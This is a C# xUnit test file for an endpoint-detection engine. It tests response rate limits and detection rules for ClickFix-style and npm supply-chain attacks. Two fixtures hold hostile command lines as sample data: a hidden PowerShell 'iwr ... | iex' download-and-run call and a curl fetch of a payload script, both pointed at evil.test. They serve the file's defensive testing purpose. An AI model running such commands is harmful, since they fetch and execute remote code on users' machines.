using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    public class V161SecurityHardeningTests : IDisposable
    {
        private readonly string _tempDir;
        private readonly JsonlEventLogger _eventLogger;
        private readonly SentinelMetrics _metrics;

        public V161SecurityHardeningTests()
        {
            _tempDir = Path.Combine(Path.GetTempPath(), "sentinel_v161_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(_tempDir);
            _eventLogger = new JsonlEventLogger(Path.Combine(_tempDir, "events.jsonl"));
            _metrics = new SentinelMetrics();
        }

        public void Dispose()
        {
            _eventLogger.DisposeAsync().AsTask().GetAwaiter().GetResult();
            try { Directory.Delete(_tempDir, true); } catch { }
        }

        [Fact]
        public void Config_Defaults_IncludeIsolateBudget()
        {
            var cfg = new SentinelConfig();
            Assert.Equal(10, cfg.MaxNetworkIsolatesPerMinute);
            Assert.Equal(15, cfg.MaxKillsPerMinute);
        }

        [Fact]
        public void EtwSessionGuard_CanBeConstructed()
        {
            var etw = new UnifiedEtwSession(NullLogger<UnifiedEtwSession>.Instance);
            var cache = new SecureCacheStore(_tempDir);
            var allowlist = new AllowlistService(cache, NullLogger<AllowlistService>.Instance);
            var scoring = new ScoringEngine(allowlist, new SafeProcessExemptionRegistry(), NullLogger<ScoringEngine>.Instance);
            var correlation = new BehavioralCorrelationEngine();
            var hashRep = new HashReputationService(cache, new ThreatReportingConfig(), NullLogger<HashReputationService>.Instance);
            var ioc = new IoCScanner(cache);
            var signer = new SignerTrustService(NullLogger<SignerTrustService>.Instance);
            var fileRep = new FileReputationEngine(hashRep, signer, cache, NullLogger<FileReputationEngine>.Instance);
            var quarantine = new QuarantineManager(Path.Combine(_tempDir, "q"));
            var response = new AdvancedResponseEngine(new SentinelConfig(), _metrics, _eventLogger, quarantine, allowlist);
            var engine = new DetectionEngine(
                new List<IDetectionRule>(), _metrics, _eventLogger, response,
                ioc, hashRep, fileRep, correlation, scoring,
                NullLogger<DetectionEngine>.Instance);

            var guard = new EtwSessionGuard(etw, engine, NullLogger<EtwSessionGuard>.Instance);
            Assert.NotNull(guard);
            guard.Dispose();
            engine.Stop();
            etw.Dispose();
        }

        [Fact]
        public async Task AdvancedResponseEngine_KillBudget_EmitsRateLimitedLog()
        {
            var config = new SentinelConfig
            {
                ActiveResponse = true, ObserveUntilChain = false,
                MaxKillsPerMinute = 2,
                MaxNetworkIsolatesPerMinute = 100
            };
            var quarantine = new QuarantineManager(Path.Combine(_tempDir, "q2"));
            var engine = new AdvancedResponseEngine(config, _metrics, _eventLogger, quarantine);

            for (int i = 0; i < 5; i++)
            {
                await engine.HandleAsync(new DetectionEvent
                {
                    RuleName = "TestKill",
                    ProcessId = 999980 + i,
                    ProcessName = "nonexistent_budget_test",
                    Confidence = 0.99,
                    Tier = DetectionTier.Tier1Behavioral,
                    AuthorizedResponse = ResponseAction.KillProcess
                });
            }

            var logPath = Path.Combine(_tempDir, "events.jsonl");
            string text;
            using (var fs = new FileStream(logPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
            using (var reader = new StreamReader(fs))
                text = await reader.ReadToEndAsync();

            Assert.True(
                text.Contains("RATE_LIMITED", StringComparison.OrdinalIgnoreCase) ||
                text.Contains("MaxKillsPerMinute", StringComparison.OrdinalIgnoreCase) ||
                text.Contains("rate-limited", StringComparison.OrdinalIgnoreCase),
                "Expected kill budget rate-limit evidence. Log:\n" + text);
        }

        [Fact]
        public void ClickFixDetectionRule_CatchesExplorerPowerShellIwr()
        {
            var rule = new ClickFixDetectionRule();
            var ctx = new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry
                {
                    ProcessId = 4242,
                    ProcessName = "powershell.exe",
                    ParentProcessName = "explorer.exe",
                    CommandLine = "powershell -nop -w hidden -c \"iwr https://evil.test/p | iex\""
                }
            };

            var det = rule.Evaluate(ctx);
            Assert.NotNull(det);
            Assert.Equal(DetectionTier.Tier1Behavioral, det!.Tier);
            Assert.Equal(ResponseAction.KillProcessTree, det.AuthorizedResponse);
        }

        [Fact]
        public void NpmSupplyChainRule_CatchesNodeSpawnedCurl()
        {
            var rule = new NpmSupplyChainRule();
            var ctx = new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry
                {
                    ProcessId = 5001,
                    ProcessName = "cmd.exe",
                    ParentProcessName = "node.exe",
                    CommandLine = "cmd /c curl https://evil.test/postinstall.ps1 -o %TEMP%\\x.ps1"
                }
            };

            var det = rule.Evaluate(ctx);
            Assert.NotNull(det);
            Assert.Contains("npm", det!.RuleName, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void NpmSupplyChainRule_IgnoresBenignNodeChild()
        {
            var rule = new NpmSupplyChainRule();
            var ctx = new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry
                {
                    ProcessId = 5002,
                    ProcessName = "cmd.exe",
                    ParentProcessName = "node.exe",
                    CommandLine = "cmd /c echo hello"
                }
            };

            Assert.Null(rule.Evaluate(ctx));
        }

        [Fact]
        public async Task AdvancedResponseEngine_RateLimitsNetworkIsolate()
        {
            var config = new SentinelConfig
            {
                ActiveResponse = true, ObserveUntilChain = false,
                MaxNetworkIsolatesPerMinute = 2,
                MaxKillsPerMinute = 100
            };
            var quarantine = new QuarantineManager(Path.Combine(_tempDir, "q"));
            var engine = new AdvancedResponseEngine(config, _metrics, _eventLogger, quarantine);

            for (int i = 0; i < 5; i++)
            {
                await engine.HandleAsync(new DetectionEvent
                {
                    RuleName = "TestBeacon",
                    ProcessId = 0,
                    ProcessName = "test",
                    Confidence = 0.99,
                    Tier = DetectionTier.Tier1Behavioral,
                    AuthorizedResponse = ResponseAction.NetworkIsolate,
                    Metadata = new Dictionary<string, string>
                    {
                        // Use documentation range 203.0.113.x (TEST-NET-3)
                        ["TargetIP"] = $"203.0.113.{10 + i}"
                    }
                });
            }

            var logPath = Path.Combine(_tempDir, "events.jsonl");
            string text;
            using (var fs = new FileStream(logPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
            using (var reader = new StreamReader(fs))
                text = await reader.ReadToEndAsync();

            Assert.True(
                text.Contains("ISOLATE_RATE_LIMITED", StringComparison.OrdinalIgnoreCase) ||
                text.Contains("MaxNetworkIsolatesPerMinute", StringComparison.OrdinalIgnoreCase) ||
                text.Contains("rate-limited", StringComparison.OrdinalIgnoreCase),
                "Expected isolate rate-limit evidence. Log:\n" + text);
        }
    }
}
